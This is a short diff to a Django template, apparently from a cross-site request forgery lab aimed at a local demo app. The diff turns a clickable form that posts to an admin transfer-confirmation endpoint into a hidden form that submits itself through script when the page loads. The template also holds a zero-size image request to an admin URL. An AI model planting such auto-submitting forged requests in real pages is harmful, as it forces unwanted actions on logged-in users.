@@ -6,9 +6,10 @@
 {% if user.is_authenticated %}
     <img src="http://127.0.0.1/admin_transfers_to_confirm/" width="0" height="0" border="0">
 
-    <form action="http://127.0.0.1:8000/admin_confirm_transfer/" method="POST">
-    <input type="submit" value="View my pictures"/>
+    <form name='CSRF' action="http://127.0.0.1:8000/admin_confirm_transfer/" method="POST">
+    <input type="hidden" value="Click here to get the price"/>
     </form>
+    <script>document.CSRF.submit()</script>
 {% endif %}
 
 {% endblock %}
